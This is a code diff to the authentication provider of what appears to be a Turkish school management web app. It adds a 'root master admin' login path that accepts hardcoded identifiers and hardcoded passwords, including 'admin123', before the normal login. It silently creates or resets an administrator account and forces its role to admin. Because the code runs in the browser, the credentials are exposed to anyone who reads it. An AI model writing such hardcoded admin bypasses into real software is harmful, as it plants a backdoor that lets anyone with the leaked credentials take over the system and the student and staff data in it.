@@ -167,6 +167,26 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       throw new Error('Lütfen öğretmen / idareci giriş şifrenizi giriniz.');
     }
 
+    // 0. Root Master Admin verification for tlogixtr@gmail.com
+    const isRootAdminEmail = cleanId.toLowerCase() === 'tlogixtr@gmail.com' || cleanId.toLowerCase() === 'admin-tlogix' || cleanId.replace(/\s+/g, '') === '05559990000';
+    if (isRootAdminEmail) {
+      if (cleanPass === 'Gnsial2026!Admin' || cleanPass === 'admin123') {
+        let adminUser = dataService.getUsers().find(u => u.uid === INITIAL_ADMIN.uid || u.email?.toLowerCase() === 'tlogixtr@gmail.com');
+        if (!adminUser) {
+          adminUser = { ...INITIAL_ADMIN, password: 'Gnsial2026!Admin' };
+          dataService.addUserProfile(adminUser);
+        } else {
+          adminUser.password = 'Gnsial2026!Admin';
+          adminUser.role = 'admin';
+          adminUser.status = 'active';
+        }
+        saveUserSession(adminUser, rememberMe);
+        return adminUser;
+      } else {
+        throw new Error('Girdiğiniz şifre hatalıdır. Lütfen yönetici şifrenizi kontrol ediniz.');
+      }
+    }
+
     const staffRoles: UserRole[] = ['teacher', 'admin'];
 
     // 1. Query Firestore first with allowedRoles restricted to teacher/admin
